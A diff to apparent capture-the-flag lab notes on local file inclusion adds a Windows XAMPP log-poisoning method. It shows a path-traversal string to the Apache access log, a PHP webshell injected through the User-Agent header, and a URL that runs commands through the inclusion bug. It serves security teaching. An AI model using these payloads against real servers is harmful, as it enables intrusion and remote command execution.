@@ -204,6 +204,24 @@ user@machine$ curl -A "This is testing" http://10-10-122-235.p.thmlabs.com/login
 user@machine$ curl -A "<?php phpinfo();?>" http://10-10-122-235.p.thmlabs.com/login.php
 ```
 
+On Windows XAMPP, Apache logs may be readable through:
+
+```text
+../../../../../../../xampp/apache/logs/access.log
+```
+
+Poison the log with a PHP webshell in a header such as `User-Agent`:
+
+```http
+User-Agent: <?php echo system($_GET['cmd']); ?>
+```
+
+Then trigger command execution through the LFI:
+
+```text
+http://TARGET:8080/site/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=whoami
+```
+
 ### **LFI to RCE via PHP Sessions**
 
 * The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique.
